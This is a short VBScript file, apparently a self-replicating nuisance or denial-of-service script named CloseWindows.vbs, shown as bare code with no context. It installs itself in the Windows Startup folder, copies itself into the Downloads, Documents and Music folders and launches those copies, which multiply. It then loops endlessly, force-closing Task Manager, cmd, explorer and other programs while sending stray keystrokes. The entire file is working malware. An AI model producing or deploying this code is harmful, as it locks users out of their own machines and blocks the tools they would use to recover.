Set WshShell = CreateObject("WScript.Shell")

' Set the paths to the destination folders
strStartupPath = WshShell.SpecialFolders("Startup")
strDownloadsPath = WshShell.SpecialFolders("MyDocuments") & "\Downloads"
strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
strMusicPath = WshShell.SpecialFolders("MyMusic")

' Create a shortcut to the script in the Startup folder
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

' Make copies of the script in the Downloads, Documents, and Music folders
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CopyFile WScript.ScriptFullName, strDownloadsPath & "\CloseWindows.vbs"
objFSO.CopyFile WScript.ScriptFullName, strDocumentsPath & "\CloseWindows.vbs"
objFSO.CopyFile WScript.ScriptFullName, strMusicPath & "\CloseWindows.vbs"

' Run the script copies when the user logs in
Set objShell = CreateObject("WScript.Shell")
objShell.Run "wscript """ & strDownloadsPath & "\CloseWindows.vbs"""
objShell.Run "wscript """ & strDocumentsPath & "\CloseWindows.vbs"""
objShell.Run "wscript """ & strMusicPath & "\CloseWindows.vbs"""

' Check for and close certain applications
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 0 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    
    'Type "n" into search bar with focus
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 'wait before checking again
Loop
